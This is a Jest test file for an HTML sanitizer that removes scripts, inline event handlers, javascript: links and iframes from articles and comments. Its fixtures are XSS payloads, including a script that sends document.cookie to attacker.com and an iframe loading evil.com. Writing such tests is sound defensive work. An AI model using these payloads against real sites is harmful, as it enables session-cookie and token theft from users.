import { sanitizeArticleHtml, sanitizeComment } from './sanitize.util';

describe('Security & XSS Content Sanitization', () => {
  it('strips <script> tags and malicious inline handlers from article HTML', () => {
    const maliciousHtml = `
      <h2>Valid Architecture Header</h2>
      <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
      <p>Clean paragraph text.</p>
      <img src="https://pixlo.local/valid.jpg" onerror="alert('xss')" />
      <div onclick="executeEvilCode()">Click me</div>
    `;

    const clean = sanitizeArticleHtml(maliciousHtml);

    expect(clean).toContain('<h2>Valid Architecture Header</h2>');
    expect(clean).toContain('<p>Clean paragraph text.</p>');
    expect(clean).not.toContain('<script>');
    expect(clean).not.toContain('fetch(');
    expect(clean).not.toContain('onerror');
    expect(clean).not.toContain('onclick');
    expect(clean).not.toContain('executeEvilCode');
  });

  it('neutralizes javascript: URIs in hyperlinks and enforces secure rel attributes', () => {
    const maliciousLink = '<a href="javascript:stealTokens()">Click for free rewards</a>';
    const clean = sanitizeArticleHtml(maliciousLink);

    expect(clean).not.toContain('javascript:');
    expect(clean).not.toContain('stealTokens');

    const validLink = '<a href="https://pixlo.local/docs">Documentation</a>';
    const cleanValid = sanitizeArticleHtml(validLink);
    expect(cleanValid).toContain('rel="noopener noreferrer nofollow"');
    expect(cleanValid).toContain('target="_blank"');
  });

  it('strips disallowed formatting and scripts from comment bodies', () => {
    const maliciousComment = '<b>Awesome article!</b><iframe src="http://evil.com"></iframe><script>bad()</script>';
    const clean = sanitizeComment(maliciousComment);

    expect(clean).toContain('<b>Awesome article!</b>');
    expect(clean).not.toContain('<iframe');
    expect(clean).not.toContain('<script');
  });
});
